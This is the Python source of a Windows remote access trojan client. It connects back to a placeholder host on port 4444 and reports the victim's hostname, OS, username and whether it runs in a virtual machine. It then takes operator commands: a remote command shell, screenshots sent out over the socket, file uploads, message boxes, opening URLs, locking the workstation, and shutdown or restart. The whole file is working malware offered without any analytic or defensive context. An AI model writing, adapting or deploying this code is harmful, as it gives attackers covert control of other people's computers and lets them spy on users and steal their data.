try:
    import socket, os, sys, platform, time, ctypes, subprocess, threading, wmi, webbrowser, pyscreeze
    import win32api, winerror, win32event, win32crypt
    from winreg import *
    from ctypes import wintypes
    
    mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        sys.exit(0)

    Complete_version = True
 
except:
 
    import socket, os, sys, platform, time, ctypes, subprocess, threading, webbrowser
    from winreg import *
    from ctypes import wintypes

    Complete_version = False
 
Host = "<Host IP>"
Port = 4444
 
strPath = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']
 
intBuffer = 1024
 
decode_utf8 = lambda data: data.decode("utf-8")
recv = lambda buffer: objSocket.recv(buffer)
send = lambda data: objSocket.send(data)
 
def detect_VM():

    objWMI = wmi.WMI()
 
    for objDiskDrive in objWMI.query("SELECT * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""
 
def server_connect(WMI):
    global objSocket
 
    while True:
        try:
            objSocket = socket.socket()
            objSocket.connect((Host, Port))
 
        except socket.error:
            time.sleep(5)
 
        else: break 
    if WMI == True:
        strUserInfo = socket.gethostname() + "<><>" + platform.system() + " " + platform.release() + detect_VM() + "<><>" + os.environ["USERNAME"]
 
    else:
        strUserInfo = socket.gethostname() + "<><>" + platform.system() + " " + platform.release() + " Limited features" + "<><>" + os.environ["USERNAME"]
 
    send(str.encode(strUserInfo))
 
 
server_connect(Complete_version)

def recvall(buffer):
    bytdata = b""
    while True:
        bytPart = recv(buffer)

        if len(bytPart) == buffer:
            return bytPart

        bytdata += bytPart
        if len(bytdata) == buffer:
            return bytdata

def command_shell():
    strCurrentDir = str(os.getcwd())
 
    send(str.encode(strCurrentDir))
 
    while True:
        strData = decode_utf8(recv(intBuffer))
 
        if strData == "cmd<>exit":
            os.chdir(strCurrentDir)  # change directory back to original
            break
 
        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory
 
                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server
 
        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
 
            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
        else:
            bytData = str.encode("Error invalid input")
 
        strBuffer = str(len(bytData))
        send(str.encode(strBuffer))  # send buffer size
        time.sleep(0.1)
        send(bytData)  # send output
 
 
 
def screenshot():
    pyscreeze.screenshot(TMP + "/s.png")
 
    send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
    + " bytes" + "\n" + "Please wait..."))
 
    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
 
    time.sleep(1)
 
    send(objPic.read())
    objPic.close()
 
def shutdown(restart=False):
    if restart == False:
        os.system("shutdown /s /t 1")
 
    elif restart == True:
        os.system("shutdown /r /t 1")

def upload(data):
    intBuff = int(data)
    file_data = recvall(intBuff)
    strOutputFile = decode_utf8(recv(intBuffer))

    try:
        objFile = open(strOutputFile, "wb")
        objFile.write(file_data)
        objFile.close()
        time.sleep(0.2)
        send(str.encode("uploaded"))
    except:
        send(str.encode("Path is protected/invalid"))


def MessageBox(message):
    objVBS = open(TMP + "/m.vbs", "w")
    objVBS.write("Msgbox \"" + message + "\",  vbOkOnly+vbInformation+vbSystemModal, \"Message\"")
    objVBS.close()
 
    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
 
while True:
    try:
        while True:
            strData = recv(intBuffer)
            strData = decode_utf8(strData)
 
            if strData == "exit<>":
                objSocket.close()
                sys.exit(0)
 
            elif strData[:5] == "msg<>":
                MessageBox(strData[5:])
 
            elif strData[:6] == "open<>":
                webbrowser.get().open(strData[6:])
 
            elif strData[:12] == "screenshot<>":
                screenshot()
 
            elif strData == "lock<>":
                ctypes.windll.user32.LockWorkStation()
 
            elif strData == "shutdown<>":
                shutdown(restart=False)
 
            elif strData == "restart<>":
                shutdown(restart=True)
 
            elif strData == "cmd<>":
                command_shell()

            elif strData[:8] == "upload<>":
                upload(strData[8:])
 
 
    except socket.error:
        objSocket.close()
        del objSocket
        server_connect()
